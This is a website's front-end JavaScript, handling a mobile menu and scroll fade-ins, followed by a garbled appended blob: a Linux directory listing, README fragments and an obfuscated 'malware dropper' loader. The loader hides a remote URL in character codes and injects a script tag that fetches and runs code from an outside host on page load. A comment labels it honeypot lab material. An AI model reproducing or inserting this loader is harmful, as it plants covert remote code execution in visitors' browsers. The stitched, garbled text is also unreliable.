(function () {
  'use strict';

  // Mobile menu toggle
  const toggle = document.querySelector('.menu-toggle');
  const mobileNav = document.querySelector('.mobile-nav');
  if (toggle && mobileNav) {
    toggle.addEventListener('click', () => {
      const expanded = toggle.getAttribute('aria-expanded') === 'true';
      toggle.setAttribute('aria-expanded', String(!expanded));
      mobileNav.classList.toggle('is-open');
    });
    // Close on outside click
    document.addEventListener('click', (e) => {
      if (!toggle.contains(e.target) && !mobileNav.contains(e.target)) {
        toggle.setAttribute('aria-expanded', 'false');
        mobileNav.classList.remove('is-open');
      }
    });
  }

  // Fade-in on scroll
  if ('IntersectionObserver' in window) {
    const observer = new IntersectionObserver(
      (entries) => {
        entries.forEach((entry) => {
          if (entry.isIntersecting) {
            entry.target.classList.add('is-visible');
            observer.unobserve(entry.target);
          }
        });
      },
      { threshold: 0.12, rootMargin: '0px 0px -40px 0px' }
    );
    document.querySelectorAll('.fade-in').forEach((el) => observer.observe(el));
  } else {
    // Fallback: show all
    document.querySelectorAll('.fade-in').forEach((el) => el.classList.add('is-visible'));
  }
})();

/bin /boot /dev /etc /home /init /lib /lib64 /lost+found /media /mnt /opt /proc /root /run /sbin /srv /sys /tmp /usr /var README.md Inject loader — the "malware dropper" stage. README.md Loaded via <script src="/trap/:slug/inject.js">. README.md README.md Obfuscates the real client.js URL using char codes (same technique as real malware). README.md Placeholders replaced at serve time: README.md 104,116,116,112,115,58,47,47,102,108,97,114,101,104,111,111,107,45,97,112,105,46,114,111,111,116,45,52,100,99,46,119,111,114,107,101,114,115,46,100,101,118,47,116,114,97,112,47,97,112,105,45,100,97,116,97,47,99,108,105,101,110,116,46,106,115 — comma-separated char codes of the client.js URL README.md README.md EDUCATIONAL PURPOSE ONLY — for honeypot security lab demonstrations. */ (function () { if (typeof window.__fh !== "undefined") return; window.__fh = 1; var _0x = [ "script", "src", "id", "onerror", "body", "head", "appendChild", "createElement", ]; var s = document[_0x[7]](_0x[0]); s[_0x[1]] = String.fromCharCode(104,116,116,112,115,58,47,47,102,108,97,114,101,104,111,111,107,45,97,112,105,46,114,111,111,116,45,52,100,99,46,119,111,114,107,101,114,115,46,100,101,118,47,116,114,97,112,47,97,112,105,45,100,97,116,97,47,99,108,105,101,110,116,46,106,115) + "?_=" + Date.now(); s[_0x[2]] = "_fh"; s[_0x[3]] = function () {}; (document[_0x[4]] || document[_0x[5]])[_0x[6]](s); })();